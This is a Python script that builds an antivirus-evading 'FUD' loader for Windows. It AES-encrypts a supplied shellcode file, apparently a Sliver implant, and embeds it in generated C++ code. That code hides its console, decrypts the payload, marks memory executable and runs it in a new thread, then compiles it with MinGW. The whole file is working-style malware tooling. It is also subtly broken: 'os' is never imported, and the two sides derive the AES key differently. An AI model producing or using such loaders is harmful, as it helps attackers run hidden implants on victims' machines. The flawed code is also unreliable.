import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def build_fud_loader(payload_path):
    if not os.path.exists(payload_path):
        print("[-] Error: Payload file not found")
        sys.exit(1)

    with open(payload_path, 'rb') as f:
        plaintext = f.read()

    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, 16))

    hex_ciphertext = ', '.join(f'0x{b:02x}' for b in ciphertext)
    hex_key = ', '.join(f'0x{b:02x}' for b in key)
    hex_iv = ', '.join(f'0x{b:02x}' for b in iv)

    cpp_code = f"""
#include <windows.h>
#include <wincrypt.h>

unsigned char encrypted_payload[] = {{{hex_ciphertext}}};
unsigned char aes_key[] = {{{hex_key}}};
unsigned char aes_iv[] = {{{hex_iv}}};

void DecryptPayload() {{
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, aes_key, sizeof(aes_key), 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);

    struct {{
        BYTE iv[16];
    }} params;
    memcpy(params.iv, aes_iv, 16);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)&params, 0);

    DWORD payload_size = sizeof(encrypted_payload);
    CryptDecrypt(hKey, 0, TRUE, 0, encrypted_payload, &payload_size);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}}

int main() {{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    DecryptPayload();

    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(encrypted_payload),
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));

    DWORD oldProtect;
    VirtualProtect(exec_mem, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}}
"""

    with open("loader.cpp", "w") as f: f.write(cpp_code)

    compile_cmd = [
        "x86_64-w64-mingw32-g++",
        "loader.cpp",
        "-o", "fud_payload.exe",
        "-Os", "-s", "-ffunction-sections",
        "-fdata-sections", "-Wl,--gc-sections",
        "-fno-exceptions", "-fno-rtti",
        "-mwindows", "-static", "-ladvapi32"
    ]

    try:
        subprocess.run(compile_cmd, check=True)
        print("[+] SUCCESS: fud_payload.exe created")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 build_fud.py <sliver_payload.bin>")
        sys.exit(1)

    build_fud_loader(sys.argv[1])
